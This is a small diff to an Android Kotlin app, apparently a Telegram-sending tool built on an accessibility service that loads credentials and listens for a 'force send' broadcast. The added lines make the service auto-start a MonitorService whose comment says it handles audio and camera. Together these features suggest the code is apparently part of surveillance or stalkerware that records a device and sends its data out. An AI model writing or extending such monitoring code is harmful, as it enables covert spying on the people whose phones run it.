@@ -83,6 +83,18 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         
         loadCredentials()
         
+        // Ensure MonitorService is running to handle Audio/Camera
+        try {
+            val monitorIntent = Intent(this, MonitorService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(monitorIntent)
+            } else {
+                startService(monitorIntent)
+            }
+        } catch (e: Exception) {
+            Log.e("TelegramService", "Failed to auto-start MonitorService", e)
+        }
+        
         // Register receiver
         val filter = android.content.IntentFilter("com.example.telegramsender.ACTION_FORCE_SEND")
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
